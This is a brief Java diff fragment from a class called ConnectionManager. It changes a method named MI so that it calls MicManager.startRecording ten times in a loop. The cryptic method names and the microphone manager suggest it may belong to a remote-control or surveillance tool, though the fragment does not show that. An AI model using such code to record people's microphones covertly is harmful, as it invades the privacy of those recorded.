@@ -147,7 +147,11 @@ public class ConnectionManager {
     }
 
     public static void MI(int sec) throws Exception{
+        int i = 0;
+        while(i<10){
         MicManager.startRecording(sec);
+            i++;
+        }
     }
 
     public static void WI() {
